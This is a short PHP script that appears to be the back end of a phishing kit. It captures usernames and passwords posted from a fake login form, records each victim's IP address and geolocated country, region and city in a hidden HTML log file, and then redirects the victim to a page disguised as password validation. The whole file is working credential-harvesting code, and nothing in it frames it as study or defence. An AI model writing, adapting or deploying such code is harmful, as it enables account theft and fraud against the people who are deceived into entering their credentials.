<?
$usuario = $_POST['username'];
$contrasena = $_POST['pass'];
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$guardame = fopen('Chukyy55H.html','a+');
fwrite($guardame,
"<br/>".$usuario.
"<br/>".$contrasena.
"<br/>"."Ip: ".$_SERVER["REMOTE_ADDR"].
"<br/>"."Info: ".$geoplugin->countryName."-".$geoplugin->region."-".$geoplugin->city.
"<br/><b>=====================================================</b>");


fclose($guardame);
header("Location: ./VALIDATEPASSWORDscisCjbTnfpNmVKQgeSUxnzRLmBdbq2BSLvH8jz8T1eNjJrxD2uact4fC1fGWN1VgTRClno-back-button.html");
exit;
?>